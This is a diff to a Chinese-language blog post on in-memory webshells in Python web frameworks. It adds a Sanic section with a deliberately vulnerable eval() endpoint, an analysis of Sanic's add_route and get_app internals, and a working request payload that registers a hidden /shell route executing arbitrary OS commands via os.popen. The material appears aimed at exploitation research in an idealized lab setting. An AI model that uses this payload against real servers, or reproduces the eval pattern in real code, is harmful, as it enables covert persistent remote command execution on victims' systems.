@@ -1,7 +1,7 @@
 ---
 title: "理想场景下的Python Web内存马探索"
 date: 2024-07-10T13:00:00+08:00
-tags: ["内存马", "python", 'django', 'tornado', 'flask']
+tags: ["内存马", "python", 'django', 'tornado', 'flask', 'sanic']
 ---
 
 在刚开始寻找Python Web内存马资料的时候，发现除了Flask SSTI之外，找不到除了这个场景、框架之外的其他资料，或许确实在这个条件下的利用场景过于稀少，并且在有RCE的情况下更多的考虑也并不是获取一个webshell。
@@ -460,3 +460,125 @@ http://localhost:8000/calc?expression=__import__(request.get_port.__globals__["s
 之后便可通过访问 `/shell` 来实现任意命令执行
 
 ![](/img/python-web-memory-shell/Pasted%20image%2020240614095128.png)
+
+
+## Sanic
+
+一个在python3.8+下的异步框架，使用起来也比较简单，一个任意代码执行的示例如下
+
+### 场景代码
+
+```python
+from sanic import Sanic
+from sanic.response import text
+
+app = Sanic("mem")
+
+@app.get("/calc")
+async def test(request):
+    result = eval(request.args.get('expression'))
+    return text(f"<h2>result: {result}</h2>")
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=8088)
+```
+
+### 请求构造
+
+首先可以发现跟tornado和flask一样，所有的东西都在一个application中，这是一个`Sanic`的实例化对象，这个类的定义如下
+
+```python
+class Sanic(
+    Generic[config_type, ctx_type],
+    StaticHandleMixin,
+    BaseSanic,
+    StartupMixin,
+    metaclass=TouchUpMeta,
+):
+```
+
+注意这里的 `BaseSnaic`，几乎所有app中能使用到的功能都在这个`mixin`中
+
+```python
+class BaseSanic(
+    RouteMixin,
+    StaticMixin,
+    MiddlewareMixin,
+    ListenerMixin,
+    ExceptionMixin,
+    SignalMixin,
+    metaclass=SanicMeta,
+):
+```
+
+而在 `RouteMixin` 中就有需要的 `add_route`
+
+```python
+ def add_route(
+        self,
+        handler: RouteHandler,
+        uri: str,
+        methods: Iterable[str] = frozenset({"GET"}),
+        host: Optional[Union[str, List[str]]] = None,
+        strict_slashes: Optional[bool] = None,
+        version: Optional[Union[int, str, float]] = None,
+        name: Optional[str] = None,
+        stream: bool = False,
+        version_prefix: str = "/v",
+        error_format: Optional[str] = None,
+        unquote: bool = False,
+        **ctx_kwargs: Any,
+    ) -> RouteHandler:
+```
+
+这个地方构造比较简单，注意到这里handler的类型为 `RouteHandler`，定义在 `models/handler_types.py`
+
+```python
+RouteHandler = Callable[..., Coroutine[Any, Any, Optional[HTTPResponse]]]
+```
+
+所以这里仍然可以传入一个lambda，那么接下来的问题就在于如何获取到当前应用所使用的对象，在`Sanic`中提供了一个函数`get_app`，原本以为需要传入name才能获取到对应的app，但是如果name为空会默认返回应用列表中的第一个
+
+```python
+@classmethod
+def get_app(
+    cls, name: Optional[str] = None, *, force_create: bool = False
+) -> Sanic:
+    if name is None:
+        if len(cls._app_registry) > 1:
+            raise SanicException(
+                'Multiple Sanic apps found, use Sanic.get_app("app_name")'
+            )
+        elif len(cls._app_registry) == 0:
+            raise SanicException("No Sanic apps have been registered.")
+        else:
+            return list(cls._app_registry.values())[0]
+    try:
+        return cls._app_registry[name]
+    except KeyError:
+        if name == "__main__":
+            return cls.get_app("__mp_main__", force_create=force_create)
+        if force_create:
+            return cls(name)
+        raise SanicException(
+            f"Sanic app name '{name}' not found.\n"
+            "App instantiation must occur outside "
+            "if __name__ == '__main__' "
+            "block or by using an AppLoader.\nSee "
+            "https://sanic.dev/en/guide/deployment/app-loader.html"
+            " for more details."
+        )
+```
+
+那么就比较容易构造了，因为这个函数本就是`@classmethod`,所以直接使用 `Sanic.get_app().add_route()`即可，注意这里的handler需要有一个`request`参数
+
+
+```
+http://localhost:8088/calc?expression=Sanic.get_app().add_route(lambda request: __import__('sanic').response.text(__import__('os').popen(request.args.get('cmd')).read()), '/shell')
+```
+
+![](/img/python-web-memory-shell/1.png)
+
+访问shell效果如下
+
+![](/img/python-web-memory-shell/2.png)
